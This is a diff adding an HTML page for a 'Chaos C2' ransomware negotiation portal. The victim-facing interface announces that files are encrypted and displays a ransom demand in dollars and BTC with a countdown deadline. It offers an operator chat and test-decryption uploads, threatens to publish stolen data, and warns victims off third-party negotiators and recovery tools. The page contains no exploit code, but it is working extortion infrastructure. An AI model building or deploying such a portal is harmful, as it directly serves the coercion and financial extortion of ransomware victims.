@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chaos C2 - Negotiation Portal</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            chaos: { 50: '#fdf8f0', 100: '#faebe0', 200: '#f4d3b5', 300: '#eab778', 400: '#e09542', 500: '#d6781e', 600: '#c45f15', 700: '#a04512', 800: '#813713', 900: '#683013', 950: '#381507' },
+            acc: { emerald: '#10b981', emeraldDim: 'rgba(16,185,129,0.15)', amber: '#f59e0b', amberDim: 'rgba(245,158,11,0.15)', rose: '#f43f5e', roseDim: 'rgba(244,63,94,0.15)', sky: '#0ea5e9', skyDim: 'rgba(14,165,233,0.15)', violet: '#8b5cf6', violetDim: 'rgba(139,92,246,0.15)', cyan: '#06b6d4', cyanDim: 'rgba(6,182,212,0.15)' },
+            surface: { 950: '#050505', 900: '#0d0d0d', 850: '#141414', 800: '#1c1c1c', 750: '#242424', 700: '#2d2d2d' }
+          },
+          fontFamily: { mono: ['JetBrains Mono', 'Fira Code', 'Consolas', 'monospace'], sans: ['Inter', 'system-ui', 'sans-serif'] },
+          animation: {
+            'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
+            'shake': 'shake 0.5s ease-in-out',
+            'flash': 'flash 1s ease-in-out infinite',
+            'countdown': 'countdown 1s linear infinite'
+          },
+          keyframes: {
+            shake: { '0%, 100%': { transform: 'translateX(0)' }, '25%': { transform: 'translateX(-5px)' }, '75%': { transform: 'translateX(5px)' } },
+            flash: { '0%, 100%': { opacity: '1' }, '50%': { opacity: '0.5' } },
+            countdown: { '0%': { transform: 'scale(1)' }, '50%': { transform: 'scale(1.05)' }, '100%': { transform: 'scale(1)' } }
+          }
+        }
+      }
+    }
+  </script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { font-family: 'Inter', sans-serif; }
+    .font-mono { font-family: 'JetBrains Mono', monospace; }
+    .bg-grid { background-image: linear-gradient(rgba(214,120,30,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(214,120,30,0.03) 1px, transparent 1px); background-size: 40px 40px; }
+    .bg-radial { background: radial-gradient(ellipse at 50% 0%, rgba(214,120,30,0.08) 0%, transparent 70%), #050505; }
+    .scrollbar-thin::-webkit-scrollbar { width: 6px; height: 6px; }
+    .scrollbar-thin::-webkit-scrollbar-track { background: #141414; }
+    .scrollbar-thin::-webkit-scrollbar-thumb { background: #3d3d3d; border-radius: 3px; }
+    .scrollbar-thin::-webkit-scrollbar-thumb:hover { background: #4d4d4d; }
+    .glass { background: rgba(28,28,28,0.8); backdrop-filter: blur(12px); border: 1px solid rgba(214,120,30,0.1); }
+    .btn-primary { background: #c45f15; color: white; font-weight: 500; border-radius: 0.5rem; padding: 0.5rem 1rem; transition: all 0.2s; }
+    .btn-primary:hover { background: #d6781e; }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-secondary { background: #1c1c1c; color: #e5e5e5; font-weight: 500; border-radius: 0.5rem; padding: 0.5rem 1rem; border: 1px solid #374151; transition: all 0.2s; }
+    .btn-secondary:hover { background: #242424; }
+    .btn-danger { background: #7f1d1d; color: #fecaca; font-weight: 500; border-radius: 0.5rem; padding: 0.5rem 1rem; border: 1px solid #991b1b; transition: all 0.2s; }
+    .btn-danger:hover { background: #991b1b; }
+    .input-base { width: 100%; background: #1c1c1c; border: 1px solid #374151; border-radius: 0.5rem; padding: 0.5rem 0.75rem; color: white; transition: all 0.2s; }
+    .input-base::placeholder { color: #6b7280; }
+    .input-base:focus { outline: none; box-shadow: 0 0 0 2px #d6781e; border-color: transparent; }
+    .card-base { background: #141414; border: 1px solid #2d2d2d; border-radius: 0.75rem; padding: 1.25rem; }
+    .stat-value { font-family: 'JetBrains Mono', monospace; font-size: 1.5rem; font-weight: 700; color: white; }
+    .stat-label { font-size: 0.625rem; color: #6b7280; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.25rem; }
+    .badge { display: inline-flex; align-items: center; gap: 0.375rem; padding: 0.125rem 0.625rem; border-radius: 9999px; font-size: 0.625rem; font-weight: 500; }
+    .badge-active { background: rgba(16,185,129,0.15); color: #10b981; }
+    .badge-warning { background: rgba(245,158,11,0.15); color: #f59e0b; }
+    .badge-danger { background: rgba(244,63,94,0.15); color: #f43f5e; }
+    .badge-info { background: rgba(14,165,233,0.15); color: #0ea5e9; }
+    .message-bubble { max-width: 75%; padding: 0.75rem 1rem; border-radius: 1rem; animation: fadeIn 0.3s ease-out; }
+    .message-victim { background: #1c1c1c; border-bottom-right-radius: 0.25rem; margin-left: auto; }
+    .message-admin { background: rgba(214,120,30,0.2); border: 1px solid rgba(214,120,30,0.3); border-bottom-left-radius: 0.25rem; }
+    .message-system { background: rgba(244,63,94,0.1); border: 1px solid rgba(244,63,94,0.2); border-radius: 0.5rem; font-size: 0.875rem; color: #fca5a5; }
+    .message-proof { background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); border-radius: 0.5rem; }
+    .countdown-critical { animation: flash 1s ease-in-out infinite; }
+    .countdown-warning { animation: countdown 1s linear infinite; }
+    .shake { animation: shake 0.5s ease-in-out; }
+    ::selection { background: rgba(214,120,30,0.3); color: white; }
+    @media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: 0.01ms !important; } }
+    .drop-zone { border: 2px dashed #374151; border-radius: 0.75rem; padding: 2rem; text-align: center; transition: all 0.2s; }
+    .drop-zone:hover { border-color: #d6781e; background: rgba(56,21,7,0.1); }
+    .drop-zone.active { border-color: #10b981; background: rgba(16,185,129,0.1); }
+  </style>
+</head>
+<body class="bg-surface-950 text-gray-100 min-h-screen bg-radial bg-grid">
+  <script>
+    window.__NEGOTIATION_CONFIG__ = { apiBase: '/api' };
+  </script>
+
+  <!-- Warning Banner -->
+  <div class="bg-acc-rose/20 border-b border-acc-rose/30 px-4 py-2">
+    <div class="max-w-4xl mx-auto flex items-center gap-2 text-sm">
+      <svg class="w-5 h-5 text-acc-rose flex-shrink-0" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      <span class="text-acc-rose font-medium">WARNING:</span>
+      <span class="text-gray-300">Your files have been encrypted. This is the only official communication channel. Do not use third-party negotiators.</span>
+    </div>
+  </div>
+
+  <div class="max-w-4xl mx-auto p-4 sm:p-6">
+    <!-- Header -->
+    <header class="mb-6">
+      <div class="flex items-center justify-between mb-4">
+        <div>
+          <h1 class="text-2xl sm:text-3xl font-bold">Negotiation Portal</h1>
+          <p class="text-gray-500 text-sm mt-1">Case ID: <span class="font-mono text-chaos-400" id="caseId">Loading...</span></p>
+        </div>
+        <div class="flex items-center gap-3">
+          <button class="btn-secondary text-sm" onclick="downloadChatLog()">Download Log</button>
+          <button class="btn-secondary text-sm" onclick="requestProof()">Request Proof</button>
+        </div>
+      </div>
+
+      <!-- Status Bar -->
+      <div class="card-base">
+        <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">
+          <div class="text-center">
+            <p class="stat-label">Status</p>
+            <p class="font-semibold" id="negotiationStatus"><span class="badge badge-warning">Waiting</span></p>
+          </div>
+          <div class="text-center">
+            <p class="stat-label">Current Demand</p>
+            <p class="stat-value text-acc-rose" id="currentRansom">$0</p>
+          </div>
+          <div class="text-center">
+            <p class="stat-label">Crypto (BTC)</p>
+            <p class="stat-value font-mono text-chaos-400" id="cryptoAmount">0.00000000</p>
+          </div>
+          <div class="text-center">
+            <p class="stat-label">Deadline</p>
+            <p class="stat-value font-mono text-acc-amber countdown-warning" id="countdownTimer">--:--:--</p>
+          </div>
+        </div>
+        
+        <!-- Progress Deadlines -->
+        <div class="mt-4 pt-4 border-t border-gray-800">
+          <div class="space-y-3" id="deadlinesList"></div>
+        </div>
+      </div>
+    </header>
+
+    <!-- Proof Section -->
+    <section id="proofSection" class="mb-6 hidden">
+      <div class="card-base border-acc-emerald">
+        <h3 class="text-lg font-semibold text-acc-emerald mb-4 flex items-center gap-2">
+          <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+          Proof of Decryption
+        </h3>
+        <div id="proofContent" class="space-y-3"></div>
+        <div class="mt-4 flex gap-2">
+          <button class="btn-primary" onclick="verifyProof()">I Can Open These Files</button>
+          <button class="btn-secondary" onclick="requestMoreProof()">Need More Proof</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Chat Area -->
+    <section class="mb-4">
+      <div class="card-base flex flex-col h-[calc(100vh-400px)] min-h-[400px] max-h-[600px]">
+        <!-- Messages -->
+        <div id="messagesContainer" class="flex-1 overflow-y-auto scrollbar-thin p-4 space-y-4" role="log" aria-live="polite">
+          <div class="text-center text-gray-500 py-8" id="emptyState">
+            <svg class="w-12 h-12 mx-auto mb-3 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"/></svg>
+            <p>Waiting for first message...</p>
+            <p class="text-xs mt-1">Messages from the operator will appear here</p>
+          </div>
+        </div>
+
+        <!-- Typing Indicator -->
+        <div id="typingIndicator" class="hidden px-4 py-2 border-t border-gray-800">
+          <div class="flex items-center gap-2 text-sm text-gray-500">
+            <div class="flex gap-1">
+              <span class="w-2 h-2 bg-chaos-500 rounded-full animate-bounce" style="animation-delay: 0ms"></span>
+              <span class="w-2 h-2 bg-chaos-500 rounded-full animate-bounce" style="animation-delay: 150ms"></span>
+              <span class="w-2 h-2 bg-chaos-500 rounded-full animate-bounce" style="animation-delay: 300ms"></span>
+            </div>
+            <span>Operator is typing...</span>
+          </div>
+        </div>
+
+        <!-- Input Area -->
+        <div class="p-4 border-t border-gray-800">
+          <div class="flex gap-2 mb-2">
+            <div id="dropZone" class="drop-zone flex-1" ondragover="handleDragOver(event)" ondragleave="handleDragLeave(event)" ondrop="handleDrop(event)" onclick="document.getElementById('fileInput').click()">
+              <input type="file" id="fileInput" class="hidden" multiple onchange="handleFileSelect(event)">
+              <svg class="w-10 h-10 mx-auto text-gray-500 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"/></svg>
+              <p class="text-sm text-gray-400">Drop files or click to attach (max 10MB each)</p>
+              <p class="text-xs text-gray-600 mt-1">Encrypted files for test decryption, screenshots, etc.</p>
+            </div>
+          </div>
+          <div class="flex gap-2">
+            <textarea id="messageInput" class="input-base flex-1 resize-none" rows="2" placeholder="Type your message..." onkeydown="handleKeydown(event)"></textarea>
+            <button id="sendBtn" class="btn-primary px-6" onclick="sendMessage()" disabled>
+              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
+            </button>
+          </div>
+          <p class="text-xs text-gray-500 text-center mt-2">Press Enter to send, Shift+Enter for new line</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Info Panel -->
+    <section class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+      <article class="card-base">
+        <h4 class="font-medium mb-3 flex items-center gap-2">
+          <svg class="w-5 h-5 text-chaos-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></path></svg>
+          Your Files
+        </h4>
+        <div class="space-y-2 text-sm" id="fileStats">
+          <div class="flex justify-between"><span class="text-gray-400">Encrypted Files</span><span class="font-mono" id="statEncrypted">--</span></div>
+          <div class="flex justify-between"><span class="text-gray-400">Total Size</span><span class="font-mono" id="statSize">--</span></div>
+          <div class="flex justify-between"><span class="text-gray-400">File Types</span><span class="font-mono" id="statTypes">--</span></div>
+        </div>
+      </article>
+
+      <article class="card-base">
+        <h4 class="font-medium mb-3 flex items-center gap-2">
+          <svg class="w-5 h-5 text-acc-emerald" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></path></svg>
+          Guarantees
+        </h4>
+        <ul class="space-y-2 text-sm text-gray-400">
+          <li class="flex items-center gap-2"><svg class="w-4 h-4 text-acc-emerald flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>Working decryptor provided after payment</li>
+          <li class="flex items-center gap-2"><svg class="w-4 h-4 text-acc-emerald flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>Files deleted from our servers</li>
+          <li class="flex items-center gap-2"><svg class="w-4 h-4 text-acc-emerald flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>No future attacks from this group</li>
+        </ul>
+      </article>
+
+      <article class="card-base border-acc-rose">
+        <h4 class="font-medium mb-3 flex items-center gap-2 text-acc-rose">
+          <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+          Critical Warnings
+        </h4>
+        <ul class="space-y-2 text-sm text-gray-400">
+          <li class="flex items-center gap-2"><svg class="w-4 h-4 text-acc-rose flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>Do not rename encrypted files</li>
+          <li class="flex items-center gap-2"><svg class="w-4 h-4 text-acc-rose flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>Do not use third-party recovery tools</li>
+          <li class="flex items-center gap-2"><svg class="w-4 h-4 text-acc-rose flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>Data will be published after final deadline</li>
+        </ul>
+      </article>
+    </section>
+  </div>
+
+  <!-- Modals -->
+  <div id="modalRoot"></div>
+
+  <!-- Toast Container -->
+  <div id="toastContainer" class="fixed bottom-6 right-6 z-50 flex flex-col gap-2"></div>
+
+  <script src="/negotiation-victim.js"></script>
+</body>
+</html>
